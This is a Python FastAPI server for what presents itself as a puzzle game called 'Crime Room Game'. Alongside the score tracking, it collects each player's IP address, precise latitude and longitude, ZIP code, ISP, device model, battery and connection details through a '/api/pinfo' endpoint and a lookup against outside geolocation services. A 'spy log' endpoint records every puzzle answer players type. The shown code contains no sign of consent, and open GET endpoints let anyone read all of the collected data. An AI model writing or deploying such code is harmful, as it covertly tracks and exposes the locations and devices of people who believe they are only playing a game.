import json
import os
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import httpx
from fastapi import FastAPI, Request
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

app = FastAPI(title="Crime Room Game")

DATA_DIR = Path("/data") if os.path.isdir("/data") else Path(__file__).parent / "data"
DATA_DIR.mkdir(exist_ok=True)
RESULTS_FILE = DATA_DIR / "results.json"
PLAYERS_INFO_FILE = DATA_DIR / "players_info.json"
SPYLOGS_FILE = DATA_DIR / "spylogs.json"


def _load(path: Path) -> list[dict]:
    if path.exists():
        try:
            return json.loads(path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, IOError):
            return []
    return []


def _save(path: Path, data: list[dict]) -> None:
    path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")


class ResultIn(BaseModel):
    name: str
    room: str
    time: str
    elapsed_ms: int


class PlayerInfoIn(BaseModel):
    name: str
    room: str
    device: str
    platform: str
    language: str
    screenWidth: int
    screenHeight: int
    ip: Optional[str] = None
    city: Optional[str] = None
    country: Optional[str] = None
    isp: Optional[str] = None
    timezone: Optional[str] = None
    zip: Optional[str] = None
    lat: Optional[float] = None
    lon: Optional[float] = None
    os: Optional[str] = None
    deviceModel: Optional[str] = None
    battery: Optional[str] = None
    connection: Optional[str] = None
    region: Optional[str] = None


class SpyLogIn(BaseModel):
    name: str
    roomNumber: str
    puzzle: str
    answer: str


@app.post("/api/results")
async def create_result(result: ResultIn):
    results = _load(RESULTS_FILE)
    results.append(
        {
            "name": result.name,
            "room": result.room,
            "time": result.time,
            "elapsed_ms": result.elapsed_ms,
            "date": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M"),
        }
    )
    _save(RESULTS_FILE, results)
    return {"ok": True}


@app.get("/api/results")
async def get_results():
    return JSONResponse({"results": _load(RESULTS_FILE)})


@app.post("/api/pinfo")
async def save_player_info(info: PlayerInfoIn, request: Request):
    players = _load(PLAYERS_INFO_FILE)
    forwarded = request.headers.get("x-forwarded-for", "")
    server_ip = forwarded.split(",")[0].strip() if forwarded else (request.client.host if request.client else "")
    players.append(
        {
            "name": info.name,
            "room": info.room,
            "device": info.device,
            "platform": info.platform,
            "language": info.language,
            "screen": f"{info.screenWidth}x{info.screenHeight}",
            "ip": info.ip or server_ip,
            "city": info.city or "",
            "country": info.country or "",
            "isp": info.isp or "",
            "timezone": info.timezone or "",
            "zip": info.zip or "",
            "lat": info.lat,
            "lon": info.lon,
            "os": info.os or "",
            "deviceModel": info.deviceModel or "",
            "battery": info.battery or "",
            "connection": info.connection or "",
            "region": info.region or "",
            "joinTime": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
        }
    )
    _save(PLAYERS_INFO_FILE, players)
    return {"ok": True}


@app.get("/api/pinfo")
async def get_players_info():
    return JSONResponse({"players": _load(PLAYERS_INFO_FILE)})


@app.post("/api/slog")
async def save_spy_log(log: SpyLogIn):
    logs = _load(SPYLOGS_FILE)
    logs.append(
        {
            "name": log.name,
            "roomNumber": log.roomNumber,
            "puzzle": log.puzzle,
            "answer": log.answer,
            "time": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
        }
    )
    _save(SPYLOGS_FILE, logs)
    return {"ok": True}


@app.get("/api/slog")
async def get_spy_logs():
    return JSONResponse({"logs": _load(SPYLOGS_FILE)})


@app.get("/")
async def index():
    return FileResponse(Path(__file__).parent / "static" / "index.html")


GEO_APIS = [
    "http://ip-api.com/json/{ip}",
    "https://ipwho.is/{ip}",
    "https://ipapi.co/{ip}/json/",
    "https://ipinfo.io/{ip}/json",
]


def _parse_geo(raw: dict) -> dict:
    result = {}
    result["ip"] = raw.get("ip") or raw.get("query") or ""
    result["city"] = raw.get("city") or ""
    result["country"] = raw.get("country_name") or raw.get("country") or ""
    result["region"] = raw.get("region") or raw.get("regionName") or ""
    result["isp"] = raw.get("org") or raw.get("isp") or ""
    tz = raw.get("timezone") or raw.get("time_zone") or ""
    if isinstance(tz, dict):
        tz = tz.get("id", "")
    result["timezone"] = tz
    result["zip"] = raw.get("postal") or raw.get("zip") or ""
    lat = raw.get("latitude") or raw.get("lat")
    lon = raw.get("longitude") or raw.get("lon")
    if lat is None and "loc" in raw:
        parts = str(raw["loc"]).split(",")
        if len(parts) == 2:
            try:
                lat, lon = float(parts[0]), float(parts[1])
            except ValueError:
                pass
    result["lat"] = lat
    result["lon"] = lon
    return result


@app.get("/api/geoip")
async def geoip(request: Request):
    forwarded = request.headers.get("x-forwarded-for", "")
    client_ip = forwarded.split(",")[0].strip() if forwarded else (request.client.host if request.client else "")
    result = {"ip": client_ip}
    async with httpx.AsyncClient(timeout=5) as client:
        for url_tpl in GEO_APIS:
            try:
                url = url_tpl.format(ip=client_ip)
                resp = await client.get(url)
                data = resp.json()
                if data.get("error") or data.get("status") == "fail":
                    continue
                parsed = _parse_geo(data)
                if parsed.get("city"):
                    return JSONResponse(parsed)
            except Exception:
                continue
    return JSONResponse(result)


app.mount("/static", StaticFiles(directory=Path(__file__).parent / "static"), name="static")
